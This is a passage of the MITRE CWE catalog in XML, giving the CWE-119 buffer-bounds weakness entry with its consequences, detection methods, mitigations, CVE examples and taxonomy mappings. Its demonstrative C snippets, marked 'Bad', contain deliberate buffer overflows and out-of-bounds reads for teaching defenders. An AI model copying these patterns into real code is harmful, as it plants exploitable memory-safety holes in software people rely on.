<?xml version="1.0" encoding="UTF-8"?>
<Weakness_Catalog xmlns="http://cwe.mitre.org/cwe-7" xmlns:xhtml="http://www.w3.org/1999/xhtml" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" Name="VIEW LIST: CWE-1425: Weaknesses in the 2023 CWE Top 25 Most Dangerous Software Weaknesses" Version="4.14" Date="2024-02-29" xsi:schemaLocation="https://cwe.mitre.org/cwe-7 http://cwe.mitre.org/data/xsd/cwe_schema_v7.1.xsd">
   <Weaknesses>
      <Weakness ID="119" Name="Improper Restriction of Operations within the Bounds of a Memory Buffer" Abstraction="Class" Structure="Simple" Status="Stable">
         <Description>The product performs operations on a memory buffer, but it can read from or write to a memory location that is outside of the intended boundary of the buffer.</Description>
         <Extended_Description>
            <xhtml:p>Certain languages allow direct addressing of memory locations and do not automatically ensure that these locations are valid for the memory buffer that is being referenced. This can cause read or write operations to be performed on memory locations that may be associated with other variables, data structures, or internal program data.</xhtml:p>
            <xhtml:p>As a result, an attacker may be able to execute arbitrary code, alter the intended control flow, read sensitive information, or cause the system to crash.</xhtml:p>
         </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="118" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="ChildOf" CWE_ID="20" View_ID="700" Ordinal="Primary"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
            <Language Name="C" Prevalence="Often"/>
            <Language Name="C++" Prevalence="Often"/>
            <Language Class="Assembly" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Alternate_Terms>
            <Alternate_Term>
               <Term>Buffer Overflow</Term>
               <Description>This term has many different meanings to different audiences.  From a CWE mapping perspective, this term should be avoided where possible. Some researchers, developers, and tools intend for it to mean "write past the end of a buffer," whereas others use the same term to mean "any read or write outside the boundaries of a buffer, whether before the beginning of the buffer or after the end of the buffer."  Still others using the same term could mean "any action after the end of a buffer, whether it is a read or write." Since the term is commonly used for exploitation and for vulnerabilities, it further confuses things.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>buffer overrun</Term>
               <Description>Some prominent vendors and researchers use the term "buffer overrun," but most people use "buffer overflow." See the alternate term for "buffer overflow" for context.</Description>
            </Alternate_Term>
            <Alternate_Term>
               <Term>memory safety</Term>
			   <Description>Generally used for techniques that avoid weaknesses related to memory access, such as those identified by CWE-119 and its descendants. However, the term is not formal, and there is likely disagreement between practitioners as to which weaknesses are implicitly covered by the "memory safety" term.</Description>
            </Alternate_Term>
         </Alternate_Terms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Integrity</Scope>
               <Scope>Confidentiality</Scope>
               <Scope>Availability</Scope>
               <Impact>Execute Unauthorized Code or Commands</Impact>
               <Impact>Modify Memory</Impact>
               <Note>If the memory accessible by the attacker can be effectively controlled, it may be possible to execute arbitrary code, as with a standard buffer overflow. If the attacker can overwrite a pointer's worth of memory (usually 32 or 64 bits), they can redirect a function pointer to their own malicious code. Even when the attacker can only modify a single byte arbitrary code execution can be possible. Sometimes this is because the same problem can be exploited repeatedly to the same effect. Other times it is because the attacker can overwrite security-critical application-specific data -- such as a flag indicating whether the user is an administrator.</Note>
            </Consequence>
            <Consequence>
               <Scope>Availability</Scope>
               <Scope>Confidentiality</Scope>
               <Impact>Read Memory</Impact>
               <Impact>DoS: Crash, Exit, or Restart</Impact>
               <Impact>DoS: Resource Consumption (CPU)</Impact>
               <Impact>DoS: Resource Consumption (Memory)</Impact>
               <Note>Out of bounds memory access will very likely result in the corruption of relevant memory, and perhaps instructions, possibly leading to a crash. Other attacks leading to lack of availability are possible, including putting the program into an infinite loop.</Note>
            </Consequence>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Memory</Impact>
               <Note>In the case of an out-of-bounds read, the attacker may have access to sensitive information. If the sensitive information contains system details, such as the current buffers position in memory, this knowledge can be used to craft further attacks, possibly with more severe consequences.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method Detection_Method_ID="DM-1">
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>This weakness can often be detected using automated static analysis tools. Many modern tools use data flow analysis or constraint-based techniques to minimize the number of false positives.</xhtml:p>
                  <xhtml:p>Automated static analysis generally does not account for environmental considerations when reporting out-of-bounds memory operations. This can make it difficult for users to determine which warnings should be investigated first. For example, an analysis tool might report buffer overflows that originate from command line arguments in a program that is not expected to run with setuid or other special privileges.</xhtml:p>
               </Description>
               <Effectiveness>High</Effectiveness>
               <Effectiveness_Notes>Detection techniques for buffer-related errors are more mature than for most other weakness types.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-2">
               <Method>Automated Dynamic Analysis</Method>
               <Description>This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.</Description>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode Quality Analysis</xhtml:li>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                       <xhtml:ul>
                         <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                       </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:ul>
                       <xhtml:li>Fuzz Tester</xhtml:li>
                       <xhtml:li>Framework-based Fuzzer</xhtml:li>
                     </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                     <xhtml:ul>
                       <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                       <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                     </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                     <xhtml:ul>
                       <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                       <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                     </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source Code Quality Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-3">
               <Phase>Requirements</Phase>
               <Strategy>Language Selection</Strategy>
               <Description>
                  <xhtml:p>Use a language that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>For example, many languages that perform their own memory management, such as Java and Perl, are not subject to buffer overflows. Other languages, such as Ada and C#, typically provide overflow protection, but the protection can be disabled by the programmer.</xhtml:p>
                  <xhtml:p>Be wary that a language's interface to native code may still be subject to overflows, even if the language itself is theoretically safe.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4.1">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Examples include the Safe C String Library (SafeStr) by Messier and Viega [REF-57], and the Strsafe.h library from Microsoft [REF-56]. These libraries provide safer versions of overflow-prone string-handling functions.</xhtml:p>
               </Description>
               <Effectiveness_Notes>This is not a complete solution, since many buffer overflows are not related to strings.</Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-10">
	      <Phase>Operation</Phase> 
	      <Phase>Build and Compilation</Phase>
	      <Strategy>Environment Hardening</Strategy> 
	      <Description> 
		<xhtml:p>Use automatic buffer overflow detection mechanisms that are offered by certain compilers or compiler extensions. Examples include: the Microsoft Visual Studio /GS flag, Fedora/Red Hat FORTIFY_SOURCE GCC flag, StackGuard, and ProPolice, which provide various mechanisms including canary-based detection and range/index checking. </xhtml:p> 
		<xhtml:p> D3-SFCV (Stack Frame Canary Validation) from D3FEND [REF-1334] discusses canary-based detection in detail. </xhtml:p> 

	      </Description> 
	      <Effectiveness>Defense in Depth</Effectiveness> 
	      <Effectiveness_Notes> 
		<xhtml:p> This is not necessarily a complete solution, since these mechanisms only detect certain types of overflows. In addition, the result is still a denial of service, since the typical response is to exit the application. </xhtml:p> 
	      </Effectiveness_Notes> 
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-9">
               <Phase>Implementation</Phase>
               <Description>
                  <xhtml:p>Consider adhering to the following rules when allocating and managing an application's memory:</xhtml:p>
                     <xhtml:ul>
                        <xhtml:li>Double check that the buffer is as large as specified.</xhtml:li>
                        <xhtml:li>When using functions that accept a number of bytes to copy, such as strncpy(), be aware that if the destination buffer size is equal to the source buffer size, it may not NULL-terminate the string.</xhtml:li>
                        <xhtml:li>Check buffer boundaries if accessing the buffer in a loop and make sure there is no danger of writing past the allocated space.</xhtml:li>
                        <xhtml:li>If necessary, truncate all input strings to a reasonable length before passing them to the copy and concatenation functions.</xhtml:li>
                     </xhtml:ul>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-11">
               <Phase>Operation</Phase> 
	       <Phase>Build and Compilation</Phase> 
	       <Strategy>Environment Hardening</Strategy> 
	       <Description>
		 <xhtml:p>Run or compile the software using features or extensions that randomly arrange the positions of a program's executable and libraries in memory. Because this makes the addresses unpredictable, it can prevent an attacker from reliably jumping to exploitable code. </xhtml:p> 
		 <xhtml:p> Examples include Address Space Layout Randomization (ASLR) [REF-58] [REF-60] and Position-Independent Executables (PIE) [REF-64]. Imported modules may be similarly realigned if their default memory addresses conflict with other modules, in a process known as "rebasing" (for Windows) and "prelinking" (for Linux) [REF-1332] using randomly generated addresses. ASLR for libraries cannot be used in conjunction with prelink since it would require relocating the libraries at run-time, defeating the whole purpose of prelinking. </xhtml:p> 
		 <xhtml:p> For more information on these techniques see D3-SAOR (Segment Address Offset Randomization) from D3FEND [REF-1335]. </xhtml:p>
	       </Description> 
	       <Effectiveness>Defense in Depth</Effectiveness> 
	       <Effectiveness_Notes>These techniques do not provide a complete solution.  For instance, exploits frequently use a bug that discloses memory addresses in order to maximize reliability of code execution [REF-1337]. It has also been shown that a side-channel attack can bypass ASLR [REF-1333]</Effectiveness_Notes> 
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-12">
               <Phase>Operation</Phase> 
	       <Strategy>Environment Hardening</Strategy> 
	       <Description> 
		 <xhtml:p> Use a CPU and operating system that offers Data Execution Protection (using hardware NX or XD bits) or the equivalent techniques that simulate this feature in software, such as PaX [REF-60] [REF-61]. These techniques ensure that any instruction executed is exclusively at a memory address that is part of the code segment.  </xhtml:p> 
	         <xhtml:p> For more information on these techniques see D3-PSEP (Process Segment Execution Prevention) from D3FEND [REF-1336]. </xhtml:p>
	       </Description> 
	       <Effectiveness>Defense in Depth</Effectiveness> 
	       <Effectiveness_Notes>This is not a complete solution, since buffer overflows could be used to overwrite nearby variables to modify the software's state in dangerous ways. In addition, it cannot be used in cases in which self-modifying code is required. Finally, an attack could still cause a denial of service, since the typical response is to exit the application. </Effectiveness_Notes> 
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-13">
               <Phase>Implementation</Phase>
               <Description>Replace unbounded copy functions with analogous functions that support length arguments, such as strcpy with strncpy. Create these if they are not available.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131).</Effectiveness_Notes>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-1" Code_File="DX-1.md">
               <Intro_Text>This example takes an IP address from a user, verifies that it is well formed and then looks up the hostname and copies it into a buffer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>void host_lookup(char *user_supplied_addr){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>struct hostent *hp;<xhtml:br/>in_addr_t *addr;<xhtml:br/>char hostname[64];<xhtml:br/>in_addr_t inet_addr(const char *cp);<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>/*routine that ensures user_supplied_addr is in the right format for conversion */</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>validate_addr_form(user_supplied_addr);<xhtml:br/>addr = inet_addr(user_supplied_addr);<xhtml:br/>hp = gethostbyaddr( addr, sizeof(struct in_addr), AF_INET);<xhtml:br/>strcpy(hostname, hp-&gt;h_name);</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>This function allocates a buffer of 64 bytes to store the hostname, however there is no guarantee that the hostname will not be larger than 64 bytes. If an attacker specifies an address which resolves to a very large hostname, then the function may overwrite sensitive data or even relinquish control flow to the attacker.</Body_Text>
               <Body_Text>Note that this example also contains an unchecked return value (CWE-252) that can lead to a NULL pointer dereference (CWE-476).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-19">
               <Intro_Text>This example applies an encoding procedure to an input string and stores it into a buffer.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>char * copy_input(char *user_supplied_string){<xhtml:div style="margin-left:1em;">
                        <xhtml:div>int i, dst_index;<xhtml:br/>char *dst_buf = (char*)malloc(4*sizeof(char) * MAX_SIZE);<xhtml:br/>if ( MAX_SIZE &lt;= strlen(user_supplied_string) ){<xhtml:div style="margin-left:1em;">die("user string too long, die evil hacker!");</xhtml:div>}<xhtml:br/>dst_index = 0;<xhtml:br/>for ( i = 0; i &lt; strlen(user_supplied_string); i++ ){<xhtml:div style="margin-left:1em;">
                              <xhtml:div>if( '&amp;' == user_supplied_string[i] ){<xhtml:div style="margin-left:1em;">dst_buf[dst_index++] = '&amp;';<xhtml:br/>dst_buf[dst_index++] = 'a';<xhtml:br/>dst_buf[dst_index++] = 'm';<xhtml:br/>dst_buf[dst_index++] = 'p';<xhtml:br/>dst_buf[dst_index++] = ';';</xhtml:div>}<xhtml:br/>else if ('&lt;' == user_supplied_string[i] ){<xhtml:div style="margin-left:1em;">
                                       <xhtml:i>/* encode to &amp;lt; */</xhtml:i>
                                       <xhtml:br/>
                                 </xhtml:div>}<xhtml:br/>else dst_buf[dst_index++] = user_supplied_string[i];</xhtml:div>
                           </xhtml:div>}<xhtml:br/>return dst_buf;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer attempts to encode the ampersand character in the user-controlled string, however the length of the string is validated before the encoding procedure is applied. Furthermore, the programmer assumes encoding expansion will only expand a given character by a factor of 4, while the encoding of the ampersand expands by 5. As a result, when the encoding procedure expands the string it is possible to overflow the destination buffer if the attacker provides a string of many ampersands.</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-90">
               <Intro_Text>The following example asks a user for an offset into an array to select an item.</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>
                     <xhtml:br/>int main (int argc, char **argv) {<xhtml:div style="margin-left:1em;">char *items[] = {"boat", "car", "truck", "train"};<xhtml:br/>int index = GetUntrustedOffset();<xhtml:br/>printf("You selected %s\n", items[index-1]);</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>The programmer allows the user to specify which element in the list to select, however an attacker can provide an out-of-bounds offset, resulting in a buffer over-read (CWE-126).</Body_Text>
            </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-100">
               <Intro_Text>In the following code, the method retrieves a value from an array at a specific array index location that is given as an input parameter to the method</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>int getValueFromArray(int *array, int len, int index) {<xhtml:div style="margin-left:1em;">
                        <xhtml:div>
                           <xhtml:br/>int value;<xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// check that the array index is less than the maximum</xhtml:i>
                           <xhtml:br/>
                           <xhtml:br/>
                           <xhtml:i>// length of the array</xhtml:i>
                           <xhtml:br/>if (index &lt; len) {<xhtml:div style="margin-left:1em;">
                              <xhtml:div>
                                 <xhtml:i>// get the value at the specified index of the array</xhtml:i>
                                 <xhtml:br/>value = array[index];</xhtml:div>
                           </xhtml:div>}<xhtml:br/>
                           <xhtml:i>// if array index is invalid then output error message</xhtml:i>
                           <xhtml:br/>
                           <xhtml:i>// and return value indicating error</xhtml:i>
                           <xhtml:br/>else {<xhtml:div style="margin-left:1em;">printf("Value is: %d\n", array[index]);<xhtml:br/>value = -1;</xhtml:div>}<xhtml:br/>
                           <xhtml:br/>return value;</xhtml:div>
                     </xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>However, this method only verifies that the given array index is less than the maximum length of the array but does not check for the minimum value (CWE-839). This will allow a negative value to be accepted as the input array index, which will result in a out of bounds read (CWE-125) and may allow access to sensitive memory. The input array index should be checked to verify that is within the maximum and minimum range required for the array (CWE-129). In this example the if statement should be modified to include a minimum range check, as shown below.</Body_Text>
               <Example_Code Nature="Good" Language="C">
                  <xhtml:div>
                     <xhtml:br/>...<xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// check that the array index is within the correct</xhtml:i>
                     <xhtml:br/>
                     <xhtml:br/>
                     <xhtml:i>// range of values for the array</xhtml:i>
                     <xhtml:br/>if (index &gt;= 0 &amp;&amp; index &lt; len) {<xhtml:br/>
                     <xhtml:br/>...</xhtml:div>
               </Example_Code>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>Windows provides the _mbs family of functions to perform various operations on multibyte strings. When these functions are passed a malformed multibyte string, such as a string containing a valid leading byte followed by a single null byte, they can read or write past the end of the string buffer causing a buffer overflow. The following functions all pose a risk of buffer overflow: _mbsinc _mbsdec _mbsncat _mbsncpy _mbsnextc _mbsnset _mbsrev _mbsset _mbsstr _mbstok _mbccpy _mbslen</Intro_Text>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2021-22991</Reference>
               <Description>Incorrect URI normalization in application traffic product leads to buffer overflow, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2021-22991</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2020-29557</Reference>
               <Description>Buffer overflow in Wi-Fi router web interface, as exploited in the wild per CISA KEV.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2020-29557</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2550</Reference>
               <Description>Classic stack-based buffer overflow in media player using a long entry in a playlist</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2550</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-2403</Reference>
               <Description>Heap-based buffer overflow in media player using a long entry in a playlist</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-2403</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0689</Reference>
               <Description>large precision value in a format string triggers overflow</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0689</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0690</Reference>
               <Description>negative offset value leads to out-of-bounds read</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0690</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1532</Reference>
               <Description>malformed inputs cause accesses of uninitialized or previously-deleted objects, leading to memory corruption</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1532</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1528</Reference>
               <Description>chain: lack of synchronization leads to memory corruption</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1528</Link>
            </Observed_Example>
	    <Observed_Example>
	      <Reference>CVE-2021-29529</Reference>
	      <Description>Chain: machine-learning product can have a heap-based
	      buffer overflow (CWE-122) when some integer-oriented bounds are
	      calculated by using ceiling() and floor() on floating point values
	      (CWE-1339)</Description>
	      <Link>https://www.cve.org/CVERecord?id=CVE-2021-29529</Link>
	    </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0558</Reference>
               <Description>attacker-controlled array index leads to code execution</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0558</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0269</Reference>
               <Description>chain: -1 value from a function call was intended to indicate an error, but is used as an array index instead.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0269</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0566</Reference>
               <Description>chain: incorrect calculations lead to incorrect pointer dereference and memory corruption</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0566</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-1350</Reference>
               <Description>product accepts crafted messages that lead to a dereference of an arbitrary pointer</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-1350</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2009-0191</Reference>
               <Description>chain: malformed input causes dereference of uninitialized memory</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2009-0191</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-4113</Reference>
               <Description>OS kernel trusts userland-supplied length value, allowing reading of sensitive information</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-4113</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-1513</Reference>
               <Description>Chain: integer overflow in securely-coded mail program leads to buffer overflow. In 2005, this was regarded as unrealistic to exploit, but in 2020, it was rediscovered to be easier to exploit due to evolutions of the technology.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-1513</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2003-0542</Reference>
               <Description>buffer overflow involving a regular expression with a large number of captures</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2003-0542</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2017-1000121</Reference>
               <Description>chain: unchecked message size metadata allows integer overflow (CWE-190) leading to buffer overflow (CWE-119).</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2017-1000121</Link>
            </Observed_Example>
         </Observed_Examples>
         <Affected_Resources>
            <Affected_Resource>Memory</Affected_Resource>
         </Affected_Resources>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A5</Entry_ID>
               <Entry_Name>Buffer Overflows</Entry_Name>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ARR00-C</Entry_ID>
               <Entry_Name>Understand how arrays work</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ARR30-C</Entry_ID>
               <Entry_Name>Do not form or use out-of-bounds pointers or array subscripts</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ARR38-C</Entry_ID>
               <Entry_Name>Guarantee that library functions do not form invalid pointers</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>ENV01-C</Entry_ID>
               <Entry_Name>Do not make assumptions about the size of an environment variable</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>EXP39-C</Entry_ID>
               <Entry_Name>Do not access a variable through a pointer of an incompatible type</Entry_Name>
               <Mapping_Fit>Imprecise</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>FIO37-C</Entry_ID>
               <Entry_Name>Do not assume character data has been read</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR31-C</Entry_ID>
               <Entry_Name>Guarantee that storage for strings has sufficient space for character data and the null terminator</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>STR32-C</Entry_ID>
               <Entry_Name>Do not pass a non-null-terminated character sequence to a library function that expects a string</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="WASC">
               <Entry_ID>7</Entry_ID>
               <Entry_Name>Buffer Overflow</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="Software Fault Patterns">
               <Entry_ID>SFP8</Entry_ID>
               <Entry_Name>Faulty Buffer Access</Entry_Name>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="10"/>
            <Related_Attack_Pattern CAPEC_ID="100"/>
            <Related_Attack_Pattern CAPEC_ID="123"/>
            <Related_Attack_Pattern CAPEC_ID="14"/>
            <Related_Attack_Pattern CAPEC_ID="24"/>
            <Related_Attack_Pattern CAPEC_ID="42"/>
            <Related_Attack_Pattern CAPEC_ID="44"/>
            <Related_Attack_Pattern CAPEC_ID="45"/>
            <Related_Attack_Pattern CAPEC_ID="46"/>
            <Related_Attack_Pattern CAPEC_ID="47"/>
            <Related_Attack_Pattern CAPEC_ID="8"/>
            <Related_Attack_Pattern CAPEC_ID="9"/>
         </Related_Attack_Patterns>
         <References>
	    <Reference External_Reference_ID="REF-1029"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 5, &#34;Public Enemy #1: The Buffer Overrun&#34; Page 127; Chapter 14, &#34;Prevent I18N Buffer Overruns&#34; Page 441"/>
            <Reference External_Reference_ID="REF-56"/>
            <Reference External_Reference_ID="REF-57"/>
            <Reference External_Reference_ID="REF-58"/>
            <Reference External_Reference_ID="REF-59"/>
            <Reference External_Reference_ID="REF-60"/>
            <Reference External_Reference_ID="REF-61"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 5, &#34;Memory Corruption&#34;, Page 167"/>
            <Reference External_Reference_ID="REF-64"/>
	    <Reference External_Reference_ID="REF-1332"/>
	    <Reference External_Reference_ID="REF-1333"/>
	    <Reference External_Reference_ID="REF-1334"/>
	    <Reference External_Reference_ID="REF-1335"/>
	    <Reference External_Reference_ID="REF-1336"/>
